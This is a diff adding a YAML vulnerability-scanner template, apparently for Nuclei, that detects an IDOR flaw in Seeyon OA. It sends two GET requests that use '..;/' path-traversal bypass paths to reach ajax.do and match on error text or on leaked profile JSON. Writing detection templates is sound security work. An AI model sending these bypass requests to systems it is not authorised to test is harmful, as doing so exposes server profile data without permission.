@@ -1,0 +1,42 @@
+id: seeyon-oa-idor
+info:
+  name: Seeyon OA IDOR Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an Insecure Direct Object Reference (IDOR) vulnerability in Seeyon OA systems by querying specific endpoints and validating the presence of indicative error messages and JSON responses.
+
+http:
+  - id: r0
+    method: GET
+    path:
+      - "{{BaseURL}}/seeyon/thirdpartyController.do.css/..;/ajax.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.lang.NullPointerException:null"
+
+  - id: r1
+    method: GET
+    path:
+      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "MMOneProfile"
+          - "productTags"
+          - "serverIdentifier"
+      - type: word
+        part: header
+        words:
+          - "application/json"
